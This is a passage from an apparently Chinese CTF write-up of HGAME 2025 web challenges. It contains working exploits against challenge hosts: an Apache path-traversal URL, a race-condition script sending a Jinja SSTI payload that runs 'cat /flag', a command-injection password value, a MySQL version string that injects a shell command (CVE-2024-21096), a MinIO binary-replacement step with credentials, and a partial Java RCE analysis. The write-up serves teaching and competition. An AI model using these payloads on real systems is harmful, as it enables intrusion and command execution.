</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p>中间需要访问/admin再返回触发</p><h3 id=level-25-双面人派对>Level 25 双面人派对</h3><p>minio,下载main文件看ida,upx脱壳后直接f12看字符得到密钥这些内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mc alias set myminio http://node1.hgame.vidar.club:32395 minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs<span style=color:#f92672>=</span>
</span></span></code></pre></div><p>然后下载hints里的src</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> (
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;level25/fetch&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;level25/conf&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;github.com/jpillora/overseer&#34;</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fetcher</span> <span style=color:#f92672>:=</span> <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>fetch</span>.<span style=color:#a6e22e>MinioFetcher</span>{
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>Bucket</span>:    <span style=color:#a6e22e>conf</span>.<span style=color:#a6e22e>MinioBucket</span>,
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>Key</span>:       <span style=color:#a6e22e>conf</span>.<span style=color:#a6e22e>MinioKey</span>,
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>Endpoint</span>:  <span style=color:#a6e22e>conf</span>.<span style=color:#a6e22e>MinioEndpoint</span>,
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>AccessKey</span>: <span style=color:#a6e22e>conf</span>.<span style=color:#a6e22e>MinioAccessKey</span>,
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>SecretKey</span>: <span style=color:#a6e22e>conf</span>.<span style=color:#a6e22e>MinioSecretKey</span>,
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>overseer</span>.<span style=color:#a6e22e>Run</span>(<span style=color:#a6e22e>overseer</span>.<span style=color:#a6e22e>Config</span>{
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>Program</span>: <span style=color:#a6e22e>program</span>,
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>Fetcher</span>: <span style=color:#a6e22e>fetcher</span>,
</span></span><span style=display:flex><span>	})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>program</span>(<span style=color:#a6e22e>state</span> <span style=color:#a6e22e>overseer</span>.<span style=color:#a6e22e>State</span>) {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>g</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Default</span>()
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>g</span>.<span style=color:#a6e22e>StaticFS</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Dir</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>true</span>))
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>g</span>.<span style=color:#a6e22e>Run</span>(<span style=color:#e6db74>&#34;:8080&#34;</span>)
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>由代码得是热加载，直接目录映射，在linux环境进行编译打包上传</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> mc cp main myminio/prodbucket/update
</span></span></code></pre></div><h3 id=level-38475-角落>Level 38475 角落</h3><p>考察一个cve，apche的2024</p><pre tabindex=0><code>http://node1.hgame.vidar.club:32126/admin/usr/local/apache2/app/%2e%2e%2f../../../../../../usr/local/apache2/app/app.py%3f
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, render_template, render_template_string, redirect
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> templates
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>pwd <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>dirname(__file__)
</span></span><span style=display:flex><span>show_msg <span style=color:#f92672>=</span> templates<span style=color:#f92672>.</span>show_msg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>readmsg</span>():
</span></span><span style=display:flex><span>	filename <span style=color:#f92672>=</span> pwd <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/tmp/message.txt&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(filename):
</span></span><span style=display:flex><span>		f <span style=color:#f92672>=</span> open(filename, <span style=color:#e6db74>&#39;r&#39;</span>)
</span></span><span style=display:flex><span>		message <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>		f<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> message
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;No message now.&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/index&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>	status <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;status&#39;</span>)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> status <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>		status <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;index.html&#34;</span>, status<span style=color:#f92672>=</span>status)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/send&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>write_message</span>():
</span></span><span style=display:flex><span>	filename <span style=color:#f92672>=</span> pwd <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/tmp/message.txt&#34;</span>
</span></span><span style=display:flex><span>	message <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;message&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	f <span style=color:#f92672>=</span> open(filename, <span style=color:#e6db74>&#39;w&#39;</span>)
</span></span><span style=display:flex><span>	f<span style=color:#f92672>.</span>write(message) 
</span></span><span style=display:flex><span>	f<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;index?status=Send successfully!!&#39;</span>)
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/read&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_message</span>():
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;{&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> readmsg():
</span></span><span style=display:flex><span>		show <span style=color:#f92672>=</span> show_msg<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;{{message}}&#34;</span>, readmsg())
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> render_template_string(show)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;waf!!&#39;</span>
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>	app<span style=color:#f92672>.</span>run(host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port <span style=color:#f92672>=</span> <span style=color:#ae81ff>5000</span>)
</span></span></code></pre></div><p>打个条件竞争</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> threading
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://node1.hgame.vidar.club:32126/app&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>send_payload</span>():
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;message&#39;</span>: <span style=color:#e6db74>&#39;{{config.__class__.__init__.__globals__[&#34;os&#34;].popen(&#34;cat /flag&#34;).read()}}&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>url<span style=color:#e6db74>}</span><span style=color:#e6db74>/send&#34;</span>, data<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_message</span>():
</span></span><span style=display:flex><span>    resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>url<span style=color:#e6db74>}</span><span style=color:#e6db74>/read&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;waf!!&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> resp<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Success! Response: </span><span style=color:#e6db74>{</span>resp<span style=color:#f92672>.</span>text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    t1 <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>send_payload)
</span></span><span style=display:flex><span>    t2 <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>read_message)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    t1<span style=color:#f92672>.</span>start()
</span></span><span style=display:flex><span>    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.01</span>)
</span></span><span style=display:flex><span>    t2<span style=color:#f92672>.</span>start()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    t1<span style=color:#f92672>.</span>join()
</span></span><span style=display:flex><span>    t2<span style=color:#f92672>.</span>join()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.1</span>)
</span></span></code></pre></div><h1 id=week2>week2</h1><h2 id=web-1>web</h2><h3 id=level-21096-honeypot>Level 21096 HoneyPot</h3><p>非预期</p><p>经过测试可以发现导入数据里面可以随便输入，输入密码的地方输入<code>; /writeflag;#</code>然后再访问<code>/flag</code>之后就可以得到flag</p><h3 id=level-21096-honeypot_revenge>Level 21096 HoneyPot_Revenge</h3><p>是<code>CVE-2024-21096mysqldump</code></p><p>大致思路就是自己用有漏洞版本的mysql，进行远程连接得到shell执行</p><p>在 MySQL 命令行中，<code>\!</code> 用于执行外部命令，比如</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mysql&gt; <span style=color:#ae81ff>\!</span> mysql -u username -p database_name &lt; backup_file.sql
</span></span></code></pre></div><p>因此</p><pre tabindex=0><code>sudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config
wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz
tar -zxvf mysql-boost-8.0.34.tar.gz
cd mysql-8.0.34
root@dkcjbRCmYFsaLJs:~/mysql-8.0.34/include# vim mysql_version.h.in

#define MYSQL_SERVER_VERSION       &#34;8.0.0-injection-test\n\\! /writeflag&#34;
</code></pre><p>然后进行编译(时间较长，浮现的时候可以干些其他的事)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mkdir build
</span></span><span style=display:flex><span>cd build
</span></span><span style=display:flex><span>cmake .. -DDOWNLOAD_BOOST<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -DWITH_BOOST<span style=color:#f92672>=</span>../boost
</span></span><span style=display:flex><span>make -j<span style=color:#66d9ef>$(</span>nproc<span style=color:#66d9ef>)</span> 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo make install
</span></span><span style=display:flex><span>sudo groupadd mysql
</span></span><span style=display:flex><span>sudo useradd -r -g mysql -s /bin/false mysql
</span></span><span style=display:flex><span>sudo /usr/local/mysql/bin/mysqld --initialize --user<span style=color:#f92672>=</span>mysql --basedir<span style=color:#f92672>=</span>/usr/local/mysql --datadir<span style=color:#f92672>=</span>/usr/local/mysql/data
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo chown -R mysql:mysql /usr/local/mysql
</span></span><span style=display:flex><span>sudo chown -R mysql:mysql /usr/local/mysql/data
</span></span><span style=display:flex><span>sudo /usr/local/mysql/bin/mysqld_safe --user<span style=color:#f92672>=</span>mysql &amp;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/usr/local/mysql/bin/mysql -u root 
</span></span></code></pre></div><p>自己重新设置一个密码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>FLUSH PRIVILEGES;
</span></span><span style=display:flex><span>ALTER USER <span style=color:#e6db74>&#39;root&#39;</span>@<span style=color:#e6db74>&#39;localhost&#39;</span> IDENTIFIED BY <span style=color:#e6db74>&#39;123456&#39;</span>;
</span></span><span style=display:flex><span>FLUSH PRIVILEGES;
</span></span><span style=display:flex><span>EXIT;
</span></span></code></pre></div><p>在cnf配置运行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>mysqld<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>bind-address <span style=color:#f92672>=</span> 0.0.0.0
</span></span></code></pre></div><p>为了安全起见创建一个用户</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>CREATE USER <span style=color:#e6db74>&#39;remote_user&#39;</span>@<span style=color:#e6db74>&#39;%&#39;</span> IDENTIFIED BY <span style=color:#e6db74>&#39;123456&#39;</span>;
</span></span><span style=display:flex><span>GRANT ALL PRIVILEGES ON *.* TO <span style=color:#e6db74>&#39;remote_user&#39;</span>@<span style=color:#e6db74>&#39;%&#39;</span> WITH GRANT OPTION;
</span></span><span style=display:flex><span>FLUSH PRIVILEGES;
</span></span></code></pre></div><p>这里是检测</p><p>用<code>SELECT user, host FROM mysql.user WHERE user = 'remote_user';</code>检查</p><p><img alt=2025-02-22163358 loading=lazy src=/posts/ctf/hgame2025/2025-02-22163358.png></p><h3 id=level-60-signinjava>Level 60 SignInJava</h3><p>动态注册恶意Bean实现RCE</p><p>审计一下代码(由于不会java所以和其他师傅要wp分析的，厌蠢症患者勿骂)</p><p>（Controller），用于处理POST请求，接受客户端传来的JSON数据，解析并根据指定的bean和方法名反射调用相应的服务方法</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a6e22e>@RequestMapping</span>(value <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;/gateway&#34;</span>}, method <span style=color:#f92672>=</span> {RequestMethod.<span style=color:#a6e22e>POST</span>})
</span></span><span style=display:flex><span><span style=color:#a6e22e>@ResponseBody</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> BaseResponse <span style=color:#a6e22e>doPost</span>(HttpServletRequest request) <span style=color:#66d9ef>throws</span> Exception {
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>String body <span style=color:#f92672>=</span> IOUtils.<span style=color:#a6e22e>toString</span>(request.<span style=color:#a6e22e>getReader</span>());
</span></span><span style=display:flex><span>Map<span style=color:#f92672>&lt;</span>String, Object<span style=color:#f92672>&gt;</span> map <span style=color:#f92672>=</span> (Map) JSON.<span style=color:#a6e22e>parseObject</span>(body, Map.<span style=color:#a6e22e>class</span>);
</span></span><span style=display:flex><span>String beanName <span style=color:#f92672>=</span> (String) map.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;beanName&#34;</span>);
</span></span><span style=display:flex><span>String methodName <span style=color:#f92672>=</span> (String) map.<span style=color:#a6e22e>get</span>(JsonEncoder.<span style=color:#a6e22e>METHOD_NAME_ATTR_NAME</span>);
</span></span><span style=display:flex><span>Map<span style=color:#f92672>&lt;</span>String, Object<span style=color:#f92672>&gt;</span> params <span style=color:#f92672>=</span> (Map) map.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;params&#34;</span>);
</span></span></code></pre></div><p>使用<code>IOUtils.toString(request.getReader())</code>读取HTTP请求体。</p><p>将请求体解析为JSON对象，并转化为<code>Map&lt;String, Object></code>类型。</p><p>从解析后的<code>map</code>中获取<code>beanName</code>、<code>methodName</code>和<code>params</code>，这些是后续反射调用所需的信息。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>if</span> (StrUtil.<span style=color:#a6e22e>containsAnyIgnoreCase</span>(beanName, <span style=color:#e6db74>&#34;flag&#34;</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> BaseResponse(403, <span style=color:#e6db74>&#34;flagTestService offline&#34;</span>, <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>如果<code>beanName</code>包含"flag"字样（不区分大小写），返回403错误，提示"flagTestService offline"。这可能是为了防止某些特殊请求（如安全相关的标志获取等）。后面的代码是反射调用和异常处理</p><hr><p>实现了一个名为 <code>InvokeUtils</code> 的工具类，主要用于动态反射调用Spring容器中的bean方法。该工具类通过反射获取指定bean的方法，并根据请求的参数动态地构建方法参数进行调用。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a6e22e>@Lazy</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> Filter autoTypeFilter <span style=color:#f92672>=</span> JSONReader.<span style=color:#a6e22e>autoTypeFilter</span>((String<span style=color:#f92672>[]</span>) ((Set) Arrays.<span style=color:#a6e22e>stream</span>(SpringContextHolder.<span style=color:#a6e22e>getApplicationContext</span>().<span style=color:#a6e22e>getBeanDefinitionNames</span>())
</span></span><span style=display:flex><span>    .<span style=color:#a6e22e>map</span>(name <span style=color:#f92672>-&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> secondDotIndex <span style=color:#f92672>=</span> name.<span style=color:#a6e22e>indexOf</span>(46, name.<span style=color:#a6e22e>indexOf</span>(46) <span style=color:#f92672>+</span> 1);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (secondDotIndex <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span>1) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> name.<span style=color:#a6e22e>substring</span>(0, secondDotIndex <span style=color:#f92672>+</span> 1);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#a6e22e>filter</span>((v0) <span style=color:#f92672>-&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Objects.<span style=color:#a6e22e>nonNull</span>(v0);
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>    .<span style=color:#a6e22e>collect</span>(Collectors.<span style=color:#a6e22e>toSet</span>())).<span style=color:#a6e22e>toArray</span>(<span style=color:#66d9ef>new</span> String<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>));
</span></span></code></pre></div><p><strong><code>@Lazy</code></strong>：<code>autoTypeFilter</code>会在第一次使用时进行初始化，避免提前加载，优化启动时间。</p><p><strong><code>autoTypeFilter</code></strong>：通过扫描Spring应用上下文中的所有bean名称，提取每个bean名的前缀（即包路径的一部分），并用于在<code>JSON.parseObject</code>方法中作为过滤器。为了防止反序列化时不安全的类型被引入</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>invokeBeanMethod</span>(String beanName, String methodName, Map<span style=color:#f92672>&lt;</span>String, Object<span style=color:#f92672>&gt;</span> params) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>    Object beanObject <span style=color:#f92672>=</span> SpringContextHolder.<span style=color:#a6e22e>getBean</span>(beanName);
</span></span><span style=display:flex><span>    Method beanMethod <span style=color:#f92672>=</span> (Method) Arrays.<span style=color:#a6e22e>stream</span>(beanObject.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getMethods</span>()).<span style=color:#a6e22e>filter</span>(method <span style=color:#f92672>-&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> method.<span style=color:#a6e22e>getName</span>().<span style=color:#a6e22e>equals</span>(methodName);
</span></span><span style=display:flex><span>    }).<span style=color:#a6e22e>findFirst</span>().<span style=color:#a6e22e>orElse</span>(<span style=color:#66d9ef>null</span>);
</span></span></code></pre></div><p><strong>获取Bean</strong>：通过<code>SpringContextHolder.getBean(beanName)</code>获取Spring容器中的bean实例。</p><p><strong>获取方法</strong>：通过<code>Arrays.stream(beanObject.getClass().getMethods())</code>获取所有方法并通过<code>method.getName().equals(methodName)</code>来找到匹配的方法。若找不到，返回<code>null</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>if</span> (beanMethod.<span style=color:#a6e22e>getParameterCount</span>() <span style=color:#f92672>==</span> 0) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> beanMethod.<span style=color:#a6e22e>invoke</span>(beanObject, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>String<span style=color:#f92672>[]</span> parameterTypes <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> String<span style=color:#f92672>[</span>beanMethod.<span style=color:#a6e22e>getParameterCount</span>()<span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span>Object<span style=color:#f92672>[]</span> parameterArgs <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>beanMethod.<span style=color:#a6e22e>getParameterCount</span>()<span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> beanMethod.<span style=color:#a6e22e>getParameters</span>().<span style=color:#a6e22e>length</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>    Class<span style=color:#f92672>&lt;?&gt;</span> parameterType <span style=color:#f92672>=</span> beanMethod.<span style=color:#a6e22e>getParameterTypes</span>()<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span>    String parameterName <span style=color:#f92672>=</span> beanMethod.<span style=color:#a6e22e>getParameters</span>()<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>.<span style=color:#a6e22e>getName</span>();
</span></span><span style=display:flex><span>    parameterTypes<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> parameterType.<span style=color:#a6e22e>getName</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>parameterType.<span style=color:#a6e22e>isPrimitive</span>() <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Date.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Long.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Integer.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Boolean.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Double.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Float.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Short.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Byte.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>Character.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>String.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>equals</span>(parameterType) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>List.<span style=color:#a6e22e>class</span>.<span 